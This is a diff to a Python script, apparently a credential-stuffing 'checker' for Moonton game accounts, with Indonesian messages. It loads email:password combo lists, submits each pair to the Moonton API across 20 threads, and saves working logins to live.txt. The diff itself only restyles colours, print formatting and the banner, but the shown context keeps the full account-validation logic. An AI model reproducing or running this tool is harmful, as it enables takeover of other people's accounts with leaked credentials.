@@ -32,7 +32,7 @@ class MOONTON:
 
     def main(self):
         print('''               
-██████╗░░█████╗░███╗░░░███╗███████╗░██████╗██╗░░██╗██╗░░░██╗███╗░░░███╗███████╗                                                                         ██╔══██╗██╔══██╗████╗░████║██╔════╝██╔════╝██║░░██║██║░░░██║████╗░████║██╔════╝
+██████╗░░█████╗░███╗░░░███╗███████╗░██████╗██╗░░██╗██╗░░░██╗███╗░░░███╗███████═══╝
 ██║░░██║██║░░██║██╔████╔██║█████╗░░╚█████╗░███████║██║░░░██║██╔████╔██║█████╗░░
 ██║░░██║██║░░██║██║╚██╔╝██║██╔══╝░░░╚═══██╗██╔══██║██║░░░██║██║╚██╔╝██║██╔══╝░░
 ██████╔╝╚█████╔╝██║░╚═╝░██║███████╗██████╔╝██║░░██║╚██████╔╝██║░╚═╝░██║███████╗
@@ -65,15 +65,15 @@ class MOONTON:
                         pass
             if len(self.userdata) == 0:
                 exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
-            print('[*] Total {0} Account\n'.format(str(len(self.userdata))))
+            print('\033[92m[*] Total {0} Account\033[0m\n'.format(str(len(self.userdata))))
             for _ in range(3):
                 for i, user in enumerate(self.userdata, 1):
                     self.loading_animation()
                     self.progress_bar(i, total_accounts)
-            print('\n[+] Proses selesai.')
+            print('\n\033[92m[+] Proses selesai.\033[0m')
             ThreadPool(20).map(self.validate, self.userdata)
-            print('\n[#] BERHASIL: \033[92m'+str(len(self.live))+' - saved: live.txt\033[0m')
-            print('[#] GAGAL: \033[91m'+str(len(self.die))+' - saved: die.txt\033[0m')
+            print('\n\033[92m[#] BERHASIL: {0} - saved: live.txt\033[0m'.format(str(len(self.live))))
+            print('\033[91m[#] GAGAL: {0} - saved: die.txt\033[0m'.format(str(len(self.die))))
             exit(0)
         else:
             print('[!] File tidak ditemukan "{0}"'.format(empas))
@@ -101,16 +101,16 @@ class MOONTON:
             data = self.build_params(user)
             response = requests.post(self.api, data=data).json()
             if response['message'] == 'Error_Success':
-                print('[\033[92mBERHASIL\033[0m] '+user['userdata'])
+                print('\033[92m[+] BERHASIL\033[0m ' + user['userdata'])
                 self.live.append(user['userdata'])
-                open('live.txt','a').write(str(user['userdata'])+'\n')
+                open('live.txt', 'a').write(str(user['userdata']) + '\n')
             else:
-                print('[\033[91mGAGAL\033[0m] '+user['userdata'])
+                print('\033[91m[+] GAGAL\033[0m ' + user['userdata'])
                 self.die.append(user['userdata'])
-                open('die.txt','a').write(str(user['userdata'])+'\n')
+                open('die.txt', 'a').write(str(user['userdata']) + '\n')
         except:
             self.validate(user)
 
 if __name__ == '__main__':
     (MOONTON().main())
-              
+        
